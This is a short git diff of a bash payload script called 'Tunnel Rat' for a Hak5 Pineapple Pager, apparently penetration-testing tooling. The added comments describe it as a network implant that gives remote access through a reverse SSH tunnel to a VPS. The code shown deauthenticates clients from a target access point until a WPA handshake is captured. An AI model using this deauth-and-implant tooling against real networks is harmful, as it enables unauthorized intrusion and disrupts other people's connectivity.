@@ -1,6 +1,9 @@
 #!/bin/bash
 # Tunnel Rat
-
+# github.com/OSINTI4L
+# Tunnel Rat is a Hak5 Pineapple Pager payload that allows remote access to the pager through a virtual private server reverse SSH tunnel. This allows the pager to be used as an implant device allowing for remote exploitation of the target network. See attached README.md for full documentation and setup.
+# Dependencies: sshpass | VPS
+# Built on Pineapple Pager firmware v1.0.6
 
 MAPSSID="Name-Management-Portal-SSID-Here"
 MAPPASS="Enter-Management-Portal-Password-Here"
@@ -43,7 +46,7 @@ DEAUTHTARG() {
     _pineap DEAUTH "$TARGETMAC" "FF:FF:FF:FF:FF:FF" "$TARGETCH"
 }
  
- # If PCAP configure filename/spawn MGMT AP, else deauth/sleep 2 minutes and check again, loop until PCAP:
+ # If PCAP configure filename/spawn MGMT AP, else deauth/sleep 1 minutes and check again, loop until PCAP:
 if [ -n "$PCAP" ]; then
     LOG green "Handshake found!"
     sleep 1.5
